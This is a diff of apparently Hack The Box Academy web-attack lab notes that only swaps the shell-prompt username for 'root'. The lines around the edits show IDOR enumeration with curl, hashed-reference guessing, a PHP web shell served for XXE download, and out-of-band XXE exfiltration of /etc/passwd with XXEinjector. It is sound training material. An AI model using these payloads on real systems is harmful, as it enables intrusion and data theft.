@@ -182,7 +182,7 @@ To see whether the server accepts `HEAD` requests, we can send an `OPTIONS` requ
 &#x20; Bypassing Basic Authentication
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -i -X OPTIONS http://SERVER_IP:PORT/
+root@htb[/htb]$ curl -i -X OPTIONS http://SERVER_IP:PORT/
 
 HTTP/1.1 200 OK
 Date: 
@@ -551,7 +551,7 @@ We can pick any unique word to be able to `grep` the link of the file. In our ca
 &#x20; Mass IDOR Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -s "http://SERVER_IP:PORT/documents.php?uid=1" | grep "<li class='pure-tree_link'>"
+root@htb[/htb]$ curl -s "http://SERVER_IP:PORT/documents.php?uid=1" | grep "<li class='pure-tree_link'>"
 
 <li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
 <li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
@@ -562,7 +562,7 @@ As we can see, we were able to capture the document links successfully. We may n
 &#x20; Mass IDOR Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"
+root@htb[/htb]$ curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"
 
 /documents/Invoice_3_06_2020.pdf
 /documents/Report_3_01_2020.pdf
@@ -617,7 +617,7 @@ We can attempt to hash various values, like `uid`, `username`, `filename`, and m
 &#x20; Bypassing Encoded References
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ echo -n 1 | md5sum
+root@htb[/htb]$ echo -n 1 | md5sum
 
 c4ca4238a0b923820dcc509a6f75849b -
 ```
@@ -651,7 +651,7 @@ We can test this by `base64` encoding our `uid=1`, and then hashing it with `md5
 &#x20; Bypassing Encoded References
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ echo -n 1 | base64 -w 0 | md5sum
+root@htb[/htb]$ echo -n 1 | base64 -w 0 | md5sum
 
 cdd96d3cc73d1dbdaffa03cc6cd7339b -
 ```
@@ -671,7 +671,7 @@ We can start by calculating the hash for each of the first ten employees using t
 &#x20; Bypassing Encoded References
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done
+root@htb[/htb]$ for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done
 
 cdd96d3cc73d1dbdaffa03cc6cd7339b
 0b7e7dee87b1c3b98e72131173dfbbbf
@@ -704,8 +704,8 @@ With that, we can run the script, and it should download all contracts for emplo
 &#x20; Bypassing Encoded References
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ bash ./exploit.sh
-AbdulrahmanTamim@htb[/htb]$ ls -1
+root@htb[/htb]$ bash ./exploit.sh
+root@htb[/htb]$ ls -1
 
 contract_006d1236aee3f92b8322299796ba1989.pdf
 contract_0b24df25fe628797b3a50ae0724d2730.pdf
@@ -1208,8 +1208,8 @@ The most efficient method to turn XXE into RCE is by fetching a web shell from o
 &#x20; Local File Disclosure
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
-AbdulrahmanTamim@htb[/htb]$ sudo python3 -m http.server 80
+root@htb[/htb]$ echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
+root@htb[/htb]$ sudo python3 -m http.server 80
 ```
 
 Now, we can use the following XML code to execute a `curl` command that downloads our web shell into the remote server:
@@ -1310,8 +1310,8 @@ So, let's try to read the `submitDetails.php` file by first storing the above li
 &#x20; Advanced File Disclosure
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
-AbdulrahmanTamim@htb[/htb]$ python3 -m http.server 8000
+root@htb[/htb]$ echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
+root@htb[/htb]$ python3 -m http.server 8000
 
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
@@ -1420,8 +1420,8 @@ So, we will first write the above PHP code to `index.php`, and then start a PHP 
 &#x20; Blind Data Exfiltration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ vi index.php # here we write the above PHP code
-AbdulrahmanTamim@htb[/htb]$ php -S 0.0.0.0:8000
+root@htb[/htb]$ vi index.php # here we write the above PHP code
+root@htb[/htb]$ php -S 0.0.0.0:8000
 
 PHP 7.4.3 Development Server (http://0.0.0.0:8000) started
 ```
@@ -1472,7 +1472,7 @@ To use this tool for automated OOB exfiltration, we can first clone the tool to 
 &#x20; Blind Data Exfiltration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ git clone https://github.com/enjoiz/XXEinjector.git
+root@htb[/htb]$ git clone https://github.com/enjoiz/XXEinjector.git
 
 Cloning into 'XXEinjector'...
 ...SNIP...
@@ -1504,7 +1504,7 @@ Now, we can run the tool with the `--host`/`--httpport` flags being our IP and p
 &#x20; Blind Data Exfiltration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
+root@htb[/htb]$ ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
 
 ...SNIP...
 [+] Sending request with malicious XML.
@@ -1515,7 +1515,7 @@ AbdulrahmanTamim@htb[/htb]$ ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000
 We see that the tool did not directly print the data. This is because we are base64 encoding the data, so it does not get printed. In any case, all exfiltrated files get stored in the `Logs` folder under the tool, and we can find our file there:
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ cat Logs/10.129.201.94/etc/passwd.log 
+root@htb[/htb]$ cat Logs/10.129.201.94/etc/passwd.log 
 
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
